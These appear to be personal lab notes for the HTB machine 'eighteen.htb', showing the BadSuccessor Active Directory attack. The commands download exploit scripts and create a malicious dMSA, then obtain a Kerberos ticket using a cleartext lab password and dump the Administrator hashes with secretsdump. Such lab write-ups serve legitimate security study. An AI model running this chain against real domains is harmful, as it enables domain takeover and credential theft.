```bash
wget https://raw.githubusercontent.com/LuemmelSec/Pentest-Tools-Collection/refs/heads/main/tools/ActiveDirectory/BadSuccessor.ps1

wget https://github.com/akamai/BadSuccessor/blob/main/Get-BadSuccessorOUPermissions.ps1
```

![[Pasted image 20260102122734.png]]

```bash
Import-Module .\BadSuccessor.ps1
BadSuccessor -mode exploit -Path "OU=Staff,DC=eighteen,DC=htb" -Name "bad_DMSA" -DelegatedAdmin "adam.scott" -DelegateTarget "Administrator" -domain "eighteen.htb"
```

![[Pasted image 20260102122900.png]]

```bash
getST.py eighteen.htb/adam.scott:iloveyou1 -impersonate "bad_DMSA$" -dc-ip 10.129.31.16 -self -dmsa

export KRB5CCNAME='bad_DMSA$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache'

secretsdump.py -k -no-pass -just-dc-user Administrator -dc-ip 10.129.31.16
```